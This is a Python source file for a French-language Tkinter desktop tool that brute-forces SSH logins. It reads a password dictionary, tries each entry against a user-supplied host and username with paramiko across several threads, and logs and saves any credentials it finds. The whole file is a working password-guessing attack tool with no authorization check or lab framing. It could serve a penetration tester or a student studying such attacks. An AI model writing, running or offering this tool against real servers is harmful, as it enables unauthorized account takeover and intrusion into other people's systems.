import paramiko
import time
import threading
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import scrolledtext, messagebox
from pathlib import Path
import socket
import os

# initialiser colorama pour les couleurs
init(autoreset=True)

# pour éviter que les logs se chevauchent
print_lock = threading.Lock()
# pour suivre l'état de l'attaque
password_found = threading.Event()
stop_attack = threading.Event()
attack_thread = None

# Dossier temporaire pour les rapports intermédiaires
temp_dir = os.path.join(os.path.dirname(__file__), "temp")
os.makedirs(temp_dir, exist_ok=True)

def save_to_temp_report(message):
    temp_report_file = os.path.join(temp_dir, "bruteforce_ssh_report.txt")
    with open(temp_report_file, 'a') as f:
        f.write(message + "\n")

def try_password(host, username, password, delay=0.1):
    if password_found.is_set() or stop_attack.is_set():
        return None
    time.sleep(delay)  # petit délai entre les tentatives
    if password_found.is_set() or stop_attack.is_set():
        return None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password, timeout=5)
        if password_found.is_set() or stop_attack.is_set():
            ssh.close()
            return None
        with print_lock:
            message = f"Succès ! Nom d'utilisateur : {username}, Mot de passe : {password}"
            log_message(message, "green")
            save_to_temp_report(message)
        password_found.set()
        ssh.close()
        return (username, password)
    except paramiko.AuthenticationException:
        with print_lock:
            message = f"Échec pour le mot de passe : {password}"
            log_message(message, "red")
            save_to_temp_report(message)
    except Exception as e:
        with print_lock:
            message = f"Erreur : {e}"
            log_message(message, "yellow")
            save_to_temp_report(message)
    return None

def brute_force_ssh(host, username, password_file, max_workers=5, delay=0.1):
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_password, host, username, password, delay) for password in passwords]

        for future in as_completed(futures):
            result = future.result()
            if result:
                for fut in futures:
                    fut.cancel()
                return result
            if stop_attack.is_set():
                break

    if not stop_attack.is_set():
        with print_lock:
            message = "Aucune combinaison nom d'utilisateur/mot de passe n'a fonctionné."
            log_message(message, "red")
            save_to_temp_report(message)
    return None

def log_message(message, color):
    output_text.config(state=tk.NORMAL)
    output_text.insert(tk.END, message + "\n", color)
    output_text.config(state=tk.DISABLED)
    output_text.see(tk.END)

def start_brute_force():
    global attack_thread

    host = app.host_entry.get()
    username = app.username_entry.get()
    password_file = app.password_file_entry.get()

    if not host or not username or not password_file:
        messagebox.showerror("Erreur", "Veuillez remplir tous les champs.")
        return

    output_text.config(state=tk.NORMAL)
    output_text.delete(1.0, tk.END)
    output_text.config(state=tk.DISABLED)

    port = 22

    stop_attack.clear()
    password_found.clear()

    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

    attack_thread = threading.Thread(target=check_server_and_start_attack, args=(host, port, username, password_file))
    attack_thread.start()

def check_server_and_start_attack(host, port, username, password_file):
    log_message("Vérification de la disponibilité du serveur SSH...", "blue")
    if not check_server_availability(host, port):
        message = f"Le serveur SSH n'est pas dispo ou le port {port} est fermé."
        log_message(message, "red")
        save_to_temp_report(message)
        root.after(0, finalize_attack)  # pour s'assurer que l'interface reste réactive
        return

    log_message("Démarrage de l'attaque bruteforce sur SSH...", "blue")

    result = brute_force_ssh(host, username, password_file)

    if result:
        username, password = result
        message = f"Mot de passe trouvé ! Nom d'utilisateur : {username}, Mot de passe : {password}"
        log_message(message, "green")
        save_to_temp_report(message)
    else:
        if not stop_attack.is_set():
            message = "Aucun mot de passe valide trouvé."
            log_message(message, "red")
            save_to_temp_report(message)
        else:
            message = "Attaque arrêtée par l'utilisateur."
            log_message(message, "red")
            save_to_temp_report(message)

    root.after(0, finalize_attack)

def stop_brute_force():
    stop_attack.set()
    if attack_thread is not None:
        attack_thread.join()
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

def finalize_attack():
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

def check_server_availability(host, port):
    try:
        with socket.create_connection((host, port), timeout=10):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

class SSHBruteforceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Programme de Bruteforce SSH")

        # ajouter l'icône
        base_dir = os.path.dirname(os.path.abspath(__file__))
        icon_path = os.path.join(base_dir, "logos", "bruteforce_ssh.ico")
        self.root.iconbitmap(icon_path)

        self.root.geometry("600x500")

        self.default_password_file = str(Path(__file__).parent / "dictionnaire_mots_de_passe.txt")

        # éléments de l'interface
        tk.Label(self.root, text="Adresse du serveur SSH:").pack(pady=5)
        self.host_entry = tk.Entry(self.root, width=50)
        self.host_entry.pack(pady=5)

        tk.Label(self.root, text="Nom d'utilisateur:").pack(pady=5)
        self.username_entry = tk.Entry(self.root, width=50)
        self.username_entry.pack(pady=5)

        tk.Label(self.root, text="Fichier de mots de passe:").pack(pady=5)
        self.password_file_entry = tk.Entry(self.root, width=50)
        self.password_file_entry.insert(0, self.default_password_file)
        self.password_file_entry.pack(pady=5)

        global start_button
        start_button = tk.Button(self.root, text="Démarrer l'attaque", command=start_brute_force)
        start_button.pack(pady=5)

        global stop_button
        stop_button = tk.Button(self.root, text="Arrêter l'attaque", command=stop_brute_force, state=tk.DISABLED)
        stop_button.pack(pady=5)

        global output_text
        output_text = scrolledtext.ScrolledText(self.root, width=80, height=10, state=tk.DISABLED)
        output_text.pack(pady=10)

        # styles pour les messages de log
        output_text.tag_config("red", foreground="red")
        output_text.tag_config("green", foreground="green")
        output_text.tag_config("yellow", foreground="orange")
        output_text.tag_config("blue", foreground="blue")

if __name__ == "__main__":
    root = tk.Tk()
    app = SSHBruteforceApp(root)
    root.mainloop()
